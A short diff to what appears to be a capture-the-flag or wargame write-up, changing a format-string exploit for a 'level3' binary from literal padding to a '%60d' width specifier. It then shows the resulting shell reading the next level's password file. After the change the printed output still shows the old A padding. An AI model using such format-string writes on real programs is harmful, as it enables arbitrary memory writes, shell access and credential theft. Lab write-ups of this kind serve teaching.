@@ -146,7 +146,7 @@ then ``fill in 60 characters to get 64``,
 then use ``%4$n`` ``to write`` with ``%n`` on the ``4th address``.
 
 ```
-$ (python -c 'print("\x8c\x98\x04\x08" + "A"*60 + "%4$n")'; cat) | ./level3
+$ (python -c 'print("\x8c\x98\x04\x08" + "%60d" + "%4$n")'; cat) | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 cat /home/user/level4/.pass
